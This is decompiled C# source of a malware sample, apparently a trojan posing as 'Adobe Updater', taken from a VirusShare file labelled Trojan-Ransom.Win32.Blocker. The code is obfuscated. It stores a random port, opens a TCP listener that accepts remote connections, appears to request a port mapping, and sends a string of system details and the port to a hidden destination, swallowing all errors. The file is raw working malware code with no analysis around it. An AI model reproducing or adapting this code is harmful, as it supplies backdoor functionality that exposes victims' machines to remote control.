// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A16C989-2208-438C-922C-7B906D6E0A07
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.hdzy-869c557bf0abceed320b3ef24b39fc8b53bf66bc6b62a6576e9ddd1978225cc1.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

public sealed class \u0002\u2001
{
  private static Random \u0002 = new Random();

  public static void \u0002()
  {
    if (\u0002\u2001.\u0002())
    {
      StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680135234));
      streamWriter.WriteLine(\u0002\u2001.\u0002.Next(2000, 20000));
      streamWriter.Close();
    }
    int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680135234)).ReadLine());
    new Thread(new ThreadStart(\u0002\u2001.\u0003)).Start();
    Thread.Sleep(5000);
    TcpListener tcpListener = new TcpListener(int32);
    new Thread(new ThreadStart(\u0002\u2001.\u0005)).Start();
    tcpListener.Start();
    while (true)
      new Thread(new ThreadStart(new \u0003(tcpListener.AcceptTcpClient()).\u0002)).Start();
  }

  public static void \u0003()
  {
    try
    {
      int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680135234)).ReadLine());
      \u0006\u2001.\u0002();
      \u0006\u2001.\u0002(int32, int32, \u000F\u2001.\u0002(1680135253), \u000F\u2001.\u0002(1680135211));
    }
    catch
    {
    }
  }

  public static void \u0005()
  {
    Thread.Sleep(10000);
    int int32 = Convert.ToInt32(new StreamReader(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680135234)).ReadLine());
    try
    {
      \u000F\u2000.\u0002(\u0002.\u0006(), int32, \u000F\u2001.\u0002(1680135224), (ushort) 80, \u000E\u2001.\u0002\u2000, \u000E\u2001.\u0003\u2000);
      string str = \u000F\u2001.\u0002(1680135173) + \u0002.\u000E() + \u000F\u2001.\u0002(1680135193) + \u0002.\u0005() + \u000F\u2001.\u0002(1680134457) + \u0006\u2001.\u0002() + \u000F\u2001.\u0002(1680135660) + (object) int32;
      \u0005\u2000.\u0002(\u000E\u2001.\u0006, str);
    }
    catch
    {
    }
  }

  public static bool \u0002() => !File.Exists(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680135234));
}
